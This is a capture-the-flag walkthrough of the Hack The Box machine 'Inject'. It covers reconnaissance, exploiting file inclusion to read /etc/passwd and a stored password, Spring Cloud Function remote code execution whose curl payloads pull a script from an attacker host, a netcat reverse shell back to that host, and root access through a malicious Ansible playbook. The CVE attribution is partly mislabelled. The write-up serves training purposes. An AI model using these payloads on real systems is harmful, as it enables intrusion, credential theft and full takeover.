# Inject

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.199.151
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:05 UTC
Nmap scan report for 10.129.199.151
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/24%OT=22%CT=1%CU=34900%PV=Y%DS=2%DC=T%G=Y%TM=64468CE
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   159.68 ms 10.10.16.1
2   111.92 ms 10.129.199.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.80 seconds
```

### Directory Busting with Gobuster

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.199.151:8080/
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.199.151:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/24 14:08:15 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 5654]
/blogs                (Status: 200) [Size: 5371]
/upload               (Status: 200) [Size: 1857]
/environment          (Status: 500) [Size: 712]
/error                (Status: 500) [Size: 106]
/release_notes        (Status: 200) [Size: 1086]
```

### Enumeration of Port 80/TCP

> http://10.129.199.151:8080

```c
$ whatweb http://10.129.199.151:8080
http://10.129.199.151:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.129.199.151], Title[Home], YouTube
```

> http://10.129.199.151:8080/upload

We uploaded a random picture and intercepted the request with `Burp Suite`.

Request:

```c
POST /upload HTTP/1.1
Host: 10.129.199.151:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------1901700343607083763025925830
Content-Length: 12488
Origin: http://10.129.199.151:8080
DNT: 1
Connection: close
Referer: http://10.129.199.151:8080/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------1901700343607083763025925830
Content-Disposition: form-data; name="file"; filename="Nyan.png"
Content-Type: image/png

PNG


```

Then we forwarded it and found the following link, displayed as `Hyperlink` on the website.

> http://10.129.199.151:8080/show_image?img=Nyan.png

```c
GET /show_image?img=Nyan.png HTTP/1.1
Host: 10.129.199.151:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.129.199.151:8080/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

## Local File Inclusion (LFI) Vulnerability

We checked for `Local File Inclusion (LFI)`.

Modified Request:

```c
GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
Host: 10.129.199.151:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.129.199.151:8080/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Mon, 24 Apr 2023 14:11:57 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

| Username |
| --- |
| frank |
| phil |

## Path Traversal Vulnerability

We also found a `Path Traversal Vulnerability`.

Modifies Request:

```c
GET /show_image?img=../../../../../../ HTTP/1.1
Host: 10.129.199.151:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.129.199.151:8080/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 4096
Date: Mon, 24 Apr 2023 14:13:26 GMT
Connection: close

bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

## Further Enumeration

Payload:

```c
GET /show_image?img=../../../../../../home/frank/ HTTP/1.1
```

Response:

```c
.bash_history
.bashrc
.cache
.local
.m2
.profile
```

Payload:

```c
GET /show_image?img=../../../../../../home/frank/.m2/ HTTP/1.1
```

Response:

```c
settings.xml
```

Payload:

```c
GET /show_image?img=../../../../../../home/frank/.m2/settings.xml HTTP/1.1
```

Response:

```c
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

| Username | Password |
| --- | --- |
| phil | DocPhillovestoInject123 |

Unfortunately the credentials didn't worked for `SSH` access.

### Enumeration of the Web Directory

Payload:

```c
GET /show_image?img=../../../../../../var/www/ HTTP/1.1
```

Response:

```c
html
WebApp
```

Payload:

```c
GET /show_image?img=../../../../../../var/www/WebApp/ HTTP/1.1
```

Response:

```c
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

Payload:

```c
GET /show_image?img=../../../../../../var/www/WebApp/pom.xml HTTP/1.1
```

Response:

```c
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
<--- SNIP --->
		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

We figured out that there was the `Spring Framework` running.

> https://spring.io/

Which was vulnerable to `CVE-2022-22965` aka `Spring4Shell` back in `2022`.

> https://www.hackthebox.com/blog/spring4shell-explained-cve-2022-22965

We found a `PoC` exploit on `GitHub`.

> https://github.com/me2nuk/CVE-2022-22963

Skeleton Exploit:

```c
curl -X POST http://0.0.0.0:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
docker exec -it --user=root vuln ls /tmp
```

Which gaves us the idea to modify it to our desired needs.

Weaponized Payload:

```c
curl -XPOST http://10.129.199.151:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.16.33/shell.sh -o /dev/shm/shell")' --data-raw 'data' -v
```

Reverse Shell Payload with the best port:

```c
$ cat shell.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.33 6969 >/tmp/f
```

Next we prepaired our webserver and listener.

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
$ nc -lnvp 6969
listening on [any] 6969 ...
```

Then we called the shell and wrote it to `/dev/shm`.

```c
$ curl -XPOST http://10.129.199.151:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.16.33/shell.sh -o /dev/shm/shell")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.199.151:8080...
* Connected to 10.129.199.151 (10.129.199.151) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.129.199.151:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.16.33/shell.sh -o /dev/shm/shell")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Mon, 24 Apr 2023 14:39:02 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-04-24T14:39:02.533+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

Hit on the webserver:

```c
10.129.199.151 - - [24/Apr/2023 14:37:20] "GET /shell.sh HTTP/1.1" 200 -
```

Then we executed the shell in `/dev/shm`.

```c
$ curl -XPOST http://10.129.199.151:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/shell")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.199.151:8080...
* Connected to 10.129.199.151 (10.129.199.151) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.129.199.151:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/shell")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Mon, 24 Apr 2023 14:41:06 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-04-24T14:41:06.026+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

Reverse Shell:

```c
$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.33] from (UNKNOWN) [10.129.199.151] 50792
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$
```

## Privilege Escalation to phil

We used the credentials which we found before.

| Username | Password |
| --- | --- |
| phil | DocPhillovestoInject123 |

```c
frank@inject:~$ su phil
su phil
Password: DocPhillovestoInject123
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

## user.txt

### Shell Upgrade

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
phil@inject:~$ cat user.txt
cat user.txt
cee1191dfc032e8c367ff736e307ebe3
```

## Pivoting

```c
phil@inject:~$ id
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

```c
phil@inject:~$ sudo -l
sudo -l
[sudo] password for phil: DocPhillovestoInject123

Sorry, user phil may not run sudo on localhost.
```

```c
phil@inject:~$ ls -la /opt
ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 Oct 20  2022 .
drwxr-xr-x 18 root root 4096 Feb  1 18:38 ..
drwxr-xr-x  3 root root 4096 Oct 20  2022 automation
```

```c
phil@inject:/opt/automation$ ls -la
ls -la
total 12
drwxr-xr-x 3 root root  4096 Oct 20  2022 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
drwxrwxr-x 2 root staff 4096 Apr 24 15:08 tasks
```

Luckily we were member of the `staff` group.

```c
phil@inject:/opt/automation/tasks$ ls -la
ls -la
total 12
drwxrwxr-x 2 root staff 4096 Apr 24 15:08 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Apr 24 15:08 playbook_1.yml
```

```c
phil@inject:/opt/automation/tasks$ cat playbook_1.yml
cat playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

## Privilege Escalation through Bad YAML

> https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/

Malicious YAML File:

```c
$ cat root.yml 
---
- name: "foobar"
  hosts: localhost
  connection: local
  tasks:
    - name: "foobar"
      shell: "chmod +s /bin/bash"
      register: "output"
```

```c
phil@inject:/opt/automation/tasks$ wget http://10.10.16.33/root.yml
```

```c
phil@inject:/opt/automation/tasks$ ansible-playbook root.yml
ansible-playbook root.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'

PLAY [foobar] ******************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [foobar] ******************************************************************
fatal: [localhost]: FAILED! => {"changed": true, "cmd": "chmod +x /bin/bash", "delta": "0:00:00.005292", "end": "2023-04-24 15:22:46.208681", "msg": "non-zero return code", "rc": 1, "start": "2023-04-24 15:22:46.203389", "stderr": "chmod: changing permissions of '/bin/bash': Operation not permitted", "stderr_lines": ["chmod: changing permissions of '/bin/bash': Operation not permitted"], "stdout": "", "stdout_lines": []}

PLAY RECAP *********************************************************************
localhost                  : ok=1    changed=0    unreachable=0    failed=1    skipped=0    rescued=0    ignored=0
```

Since the files in this directory got deleted after a minute or so, it was clear that
there was some sort of cronjob running.

After some time, the `SUID bit` got set on `/bin/bash`.

```c
phil@inject:/opt/automation/tasks$ ls -la /tmp
ls -la /tmp
total 1228
drwxrwxrwt 15 root  root    12288 Apr 24 15:20 .
drwxr-xr-x 18 root  root     4096 Feb  1 18:38 ..
-rwsr-sr-x  1 phil  phil  1183448 Apr 24 15:20 bash
```

```c
phil@inject:/opt/automation/tasks$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```c
phil@inject:/opt/automation/tasks$ /bin/bash -p
/bin/bash -p
bash-5.0#
```

## root.txt

```c
bash-5.0# cat /root/root.txt
cat /root/root.txt
56fe1bbdc1272650558b8e7f62e8255d
```
